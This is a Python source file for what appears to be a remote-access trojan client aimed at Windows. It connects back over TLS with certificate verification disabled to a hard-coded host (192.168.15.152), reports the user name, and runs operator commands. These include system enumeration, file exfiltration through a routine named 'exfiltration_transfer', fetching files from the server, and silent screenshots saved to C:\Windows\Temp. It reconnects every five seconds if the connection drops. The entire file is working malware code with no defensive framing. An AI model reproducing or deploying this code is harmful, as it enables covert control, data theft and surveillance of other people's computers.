import os
import socket
import ssl
import subprocess
import time
import struct

def q(host, port):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            print("Trying Connection...")
            n = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with context.wrap_socket(n, server_hostname=host) as p:
                p.connect((host, port))
                print(f"Conectado a {host}:{port} usando SSL")
                whoami = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
                result = f"{whoami.stdout.strip()}"
                p.sendall(result.encode())

                while True:
                    try:
                        command = p.recv(4096).decode('utf-8').strip()

                        if command == "pwd":
                            crd = os.getcwd()
                            p.sendall(crd.encode('utf-8'))

                        elif command == "ls -la" or command == "ls":
                            itens = subprocess.check_output('dir /a', shell=True, text=True)
                            itens_bytes = itens.encode('utf-8')
                            data_length = len(itens_bytes)

                            p.sendall(struct.pack('>I', data_length))

                            p.sendall(itens_bytes)


                        elif command == "sysinfo" or command == "systeminfo":
                            itens = subprocess.check_output('systeminfo', shell=True, text=True)
                            itens_bytes = itens.encode('utf-8')
                            data_length = len(itens_bytes)

                            p.sendall(struct.pack('>I', data_length))
                            p.sendall(itens_bytes)


                        elif command == 'cd ..':
                            try:
                                path_parent = os.path.dirname(os.getcwd())
                                os.chdir(path_parent)
                                response = os.getcwd()
                                p.sendall(response.encode())

                            except Exception as e:
                                p.sendall(str(e).encode())

                        elif command.startswith('cd '):
                            try:
                                path = command.split(' ', 1)[1]
                                os.chdir(path)
                                response = os.getcwd()
                                p.sendall(response.encode('utf-8'))
                            except Exception as e:
                                p.sendall(str(e).encode('utf-8'))




                        elif command.startswith('download '):
                            parts = command.split(' ', 1)
                            if len(parts) > 1:
                                file_name = parts[1].strip()
                                if os.path.exists(file_name):
                                    def exfiltration_transfer():
                                        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                                        context.check_hostname = False
                                        context.verify_mode = ssl.CERT_NONE
                                        exfiltration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        with context.wrap_socket(exfiltration_socket,server_hostname=host) as exfil_conn:
                                            exfil_conn.connect((host, 443))
                                            exfil_conn.sendall(file_name.encode('utf-8'))
                                            with open(file_name, "rb") as file:
                                                while data := file.read(4096):
                                                    exfil_conn.sendall(data)
                                            print(f"File {file_name} send successfully!")
                                            exfil_conn.close()

                                    exfiltration_transfer()


                        elif command.startswith('upload '):
                            parts = command.split(' ', 1)
                            if len(parts) > 1:
                                file_name = parts[1].strip()
                                print(file_name)
                                host = "192.168.15.152"
                                conn = None
                                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                try:

                                    infiltrate_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    conn = context.wrap_socket(infiltrate_socket, server_hostname=host)
                                    conn.connect((host, 443))

                                    file_name = conn.recv(1024).decode('utf-8')
                                    print(f"Downloading file: {file_name}")


                                    with open(file_name, 'wb') as file:
                                        while True:
                                            data = conn.recv(4096)
                                            if not data:
                                                break
                                            file.write(data)
                                except Exception as e:
                                    print(f"An error occurred: {e}")
                                finally:

                                    if conn:
                                        conn.close()



                        elif command == "print":
                            import string
                            import random
                            import pyautogui

                            size = 10
                            ramdom_numbers = random.randint(0, 500)
                            random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=size))
                            file_name = f'{random_string}{str(ramdom_numbers)}.png'
                            file_path = os.path.join(r'C:\Windows\Temp', file_name)
                            scs = pyautogui.screenshot()
                            scs.save(file_path)
                            result = f"Print successfully saved in Temp directory with name {file_name}".encode()
                            p.sendall(result)

                        elif command == "SERVER_SHUTDOWN":
                            print("Shutting down. Trying to reconnect...")
                            break

                    except (socket.error, ssl.SSLError) as e:
                        print(f"[!] Communication error: {e}")
                        break

        except Exception as e:
            print(f"Connection Refused: {e}")
            time.sleep(5)


a = "192.168.15.152"
b = 9000
q(a, b)
